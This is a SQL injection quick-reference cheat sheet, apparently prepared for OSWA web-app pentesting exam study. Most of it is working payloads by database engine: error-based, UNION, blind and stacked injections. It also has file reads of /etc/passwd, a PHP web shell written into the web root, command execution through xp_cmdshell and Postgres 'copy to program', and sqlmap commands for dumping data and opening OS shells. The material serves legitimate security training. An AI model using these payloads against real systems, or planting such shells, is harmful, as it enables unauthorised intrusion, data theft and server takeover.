---
category: OSWA Web App Pentesting
order: 1
summary: Methodology, engine fingerprinting, error/UNION/blind/stacked payloads by DB engine, file read/write, RCE, and sqlmap quick reference.
---
# SQL Injection

One-stop quick reference for manual SQLi and sqlmap.

## Methodology (fast path)
1. Probe with `'` → watch for error/behavior change. No quote needed at all? Likely numeric context.
2. If errors are silenced, sweep parenthesis depth with true/false pairs (`OR 1=1` / `OR 1=2`) until both respond cleanly — that's your closure.
3. Fingerprint the engine (table below).
4. Pick a technique based on what the app gives back: error text → error-based; rendered rows → UNION-based; nothing at all → stacked/blind, or hand it to sqlmap.
5. Enumerate schema → table → column → data, in that order.
6. If the objective calls for it, escalate to file read/write or RCE.

## Engine fingerprinting (no verbose errors)
| Engine | Payload | Confirms |
|---|---|---|
| SQL Server | `OR LEN('a')=1` | Only SQL Server has `LEN()` |
| Oracle | `OR NVL(1,2) IS NOT NULL` | Oracle-only `ISNULL` equivalent |
| Oracle | `OR (SELECT 1 FROM DUAL)=1` | `DUAL` only exists in Oracle |
| MySQL | `OR DATABASE() IS NOT NULL` | MySQL-only function |
| PostgreSQL | `OR current_database() IS NOT NULL` | Postgres-only function |

Try in order: SQL Server → Oracle → MySQL vs Postgres (max 3 requests).

**Comment syntax:** MySQL `-- ` (needs trailing space/char, or use `-- -`) or `#`. Postgres/Oracle/SQL Server: `--` (no trailing space needed). `#` is MySQL-only.

## Closing out a payload
```
foo') or id=11-- -
```
Close the string (`'`) → close the function/paren (`)`) → inject your logic → comment out the rest (`-- -`). Default to this shape whenever unsure of the surrounding query.

## Blind closure sweep (fully silenced errors)
```
x%' OR 1=1-- -        x%' OR 1=2-- -          (0 parens)
x%') OR 1=1-- -       x%') OR 1=2-- -         (1 paren)
x%')) OR 1=1-- -      x%')) OR 1=2-- -        (2 parens)
```
Correct depth = the level where `1=1` returns everything AND `1=2` returns a clean empty result — no error on either side.

## Error-based payloads, by engine

**MySQL:**
```sql
extractvalue('', concat('>', version()))
extractvalue('', concat('>', (select group_concat(table_name) from
  (select table_name from information_schema.tables where table_schema=DATABASE() limit 2 offset 0) as foo)))
```
32-char gotcha: the delimiter you prepend (e.g. `>`) counts against the 32-char cap. Pull the missing char separately with `substring(x,32,1)`, then continue with `substring(x,33,N)`.

**PostgreSQL:**
```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

**MSSQL:**
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CAST(@@version AS int)--
```

**Oracle:**
```sql
to_char(dbms_xmlgen.getxml('select "'||(select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```
Oracle has no `information_schema` — use `all_tables` / `all_tab_columns` instead, and every `SELECT` needs `FROM dual` if there's no real table to select from.

## UNION-based payloads
```sql
' UNION SELECT NULL,NULL--                                        -- find column count
' UNION SELECT table_name, table_schema FROM information_schema.tables
  WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys')--
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='flags'--

-- numeric context, no quotes needed
id=-1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys')
```
Same column count + compatible types both sides. Oracle needs `FROM dual`. Use `UNION ALL` to keep duplicate rows.

## Stacked queries, by engine
```
'; SELECT SLEEP(5)-- -          -- MySQL
'; SELECT pg_sleep(5)--         -- PostgreSQL
'); WAITFOR DELAY '0:0:5'--     -- MSSQL
```
Oracle doesn't support stacked queries at all (no `;` chaining) — limited to sub-selects/UNION there.

Time-based blind without stacking (single query, PostgreSQL):
```sql
x'||pg_sleep(10)--
```
`||` is concatenation, not `OR` — `OR pg_sleep(5)` fails because Postgres requires `boolean` on both sides of `OR`.

## File read / write, by engine

**PostgreSQL:**
```sql
select pg_read_file('/etc/passwd');
copy (select '<?php system($_GET["cmd"]); ?>') to '/var/www/html/shell.php';
copy (select '') to program 'cat /root/flag.txt';        -- direct RCE, needs superuser/pg_execute_server_program
```

**MySQL:**
```sql
SELECT @@GLOBAL.secure_file_priv;    -- path = restricted | empty = unrestricted | NULL = disabled
SELECT LOAD_FILE('/var/lib/mysql-files/flag.txt');
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```
`INTO OUTFILE` returns no row set — an app error right after it doesn't mean it failed; check the file directly.

**Oracle:** file read/write needs `UTL_FILE` with a valid `CREATE DIRECTORY` object — rarely usable from a low-priv injection.

## RCE, by engine

**MSSQL — `xp_cmdshell`:**
```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```
Needs `EXECUTE` (not `SELECT`) → usually needs stacked-query support. Not available on Linux-hosted SQL Server.

**PostgreSQL:** `copy ... to program` (above) is the RCE primitive for Postgres (needs superuser or `pg_execute_server_program`).

## sqlmap quick reference
```bash
# discover across a whole site
sqlmap -u "http://target/" --crawl=3 --forms --batch

# targeted POST test
sqlmap -u "http://target/api" --method POST --data "db=mysql&name=a&sort=id&order=asc" -p "name,sort,order"

# from a captured Burp request
sqlmap -r request.txt

# enumerate / dump
sqlmap -u "URL" --batch --dbs
sqlmap -u "URL" --batch -D db -T users --dump
sqlmap -u "URL" --dbms=mysql --search -T flag,secret,token      # find interesting tables fast

# shells / files
sqlmap -u "URL" --batch --os-shell
sqlmap -u "URL" --file-read="/etc/passwd"

# tuning / control
sqlmap -u "URL" --dbms=oracle --level=5 --risk=3                # try harder when you know it's vulnerable
sqlmap -u "URL" --dbms=oracle --flush-session --fresh-queries   # discard stale fingerprint
```
**OSWA note:** sqlmap is on OffSec's explicitly permitted exam tool list.

## Reference links
- [PentestMonkey — MySQL](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) · [PostgreSQL](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet) · [MSSQL](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) · [Oracle](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
